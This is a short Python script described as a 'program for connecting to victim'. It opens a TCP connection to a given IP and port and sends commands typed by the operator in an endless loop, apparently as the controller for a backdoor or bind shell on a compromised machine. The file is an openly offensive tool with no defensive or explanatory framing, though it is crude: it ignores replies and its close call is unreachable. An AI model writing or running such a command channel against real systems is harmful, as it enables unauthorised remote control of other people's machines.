from socket import socket, AF_INET, SOCK_STREAM
import argparse

# Argument Parsing
parser = argparse.ArgumentParser(description = "Program for connecting to victim.")
parser.add_argument("--ip", dest="ip", required=True, type=str)
parser.add_argument("--port", dest="port", required=True, type=int)

args = parser.parse_args()
victim_address = (args.ip, args.port)

sock = socket(AF_INET, SOCK_STREAM)
sock.connect(victim_address)
while True:
    msg = input("Enter a command: ")
    sock.sendall(msg.encode("utf-8"))
sock.close()

